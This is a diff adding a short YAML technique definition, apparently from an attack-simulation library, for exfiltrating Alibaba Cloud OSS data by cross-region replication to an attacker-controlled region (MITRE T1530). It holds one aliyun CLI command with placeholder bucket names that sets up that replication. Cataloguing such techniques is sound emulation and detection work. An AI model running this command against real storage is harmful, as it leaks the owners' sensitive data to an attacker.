@@ -1,0 +1,7 @@
+name: Malicious Cross-Region Replication
+description: Replicate sensitive OSS data to attacker-controlled region.
+mitre_technique: T1530
+stage: Exfiltration
+steps:
+  - action: aliyun oss put-bucket-replication --bucket <source-bucket> --replication-configuration file://replication.json
+    description: Setup replication from source to remote attacker-controlled region
